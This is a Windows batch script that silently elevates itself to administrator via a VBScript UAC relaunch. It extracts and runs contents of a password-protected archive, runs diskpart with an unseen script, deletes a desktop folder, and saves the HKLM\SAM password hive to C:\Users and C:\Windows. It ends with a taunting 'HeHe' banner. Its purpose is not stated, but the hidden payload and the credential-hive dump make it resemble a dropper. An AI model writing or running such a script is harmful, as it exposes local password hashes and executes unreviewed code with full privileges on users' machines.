@echo OFF
set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
rmdir /s /q "%~dp0\Script" 2>nul
mkdir "%~dp0\Script"
"%~dp0\Tools\7z.exe" x "%~dp0Script.zip" -o"%~dp0\Script" -pminhtuan283 -y -aoa
ping 127.0.0.1 -n 2
start "" /min "%~dp0Script\internet.bat"
diskpart.exe /s %~dp0\Script\doiten.txt
ping 127.0.0.1 -n 2
rmdir /s /q "%~dp0\App" 2>nul
mkdir "%~dp0\App"
"%~dp0\Tools\7z.exe" x "%~dp0App.zip" -o"%~dp0\App" -y -aoa
rmdir /s /q "%USERPROFILE%\desktop\1-Soft"
reg save HKLM\SAM C:\Users\SAM
reg save HKLM\SAM C:\Windows\SAM
cls

echo " _   _      _   _      _   _      _   _      "
echo "| | | | ___| | | | ___| | | | ___| | | | ___ "
echo "| |_| |/ _ \ |_| |/ _ \ |_| |/ _ \ |_| |/ _ \"
echo "|  _  |  __/  _  |  __/  _  |  __/  _  |  __/"
echo "|_| |_|\___|_| |_|\___|_| |_|\___|_| |_|\___|"

timeout /t 10

rem taskkill /im cmd.exe /f

exit





